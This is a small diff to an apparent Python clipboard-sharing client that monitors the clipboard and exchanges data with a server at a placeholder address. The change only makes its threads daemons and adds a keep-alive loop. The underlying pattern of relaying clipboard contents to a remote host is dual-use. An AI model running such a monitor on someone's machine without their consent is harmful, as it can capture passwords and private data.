@@ -1,6 +1,7 @@
 import socket
 import threading
 import pyperclip
+import time
 
 SERVER_IP = 'SERVER_IP'
 def receive_from_server():
@@ -38,7 +39,13 @@ def send_to_server(data):
 
 if __name__ == "__main__":
     receive_thread = threading.Thread(target=receive_from_server)
+    receive_thread.daemon = True
     receive_thread.start()
 
     monitor_thread = threading.Thread(target=monitor_clipboard)
+    monitor_thread.daemon = True
     monitor_thread.start()
+
+    while True:
+        time.sleep(1)
+        
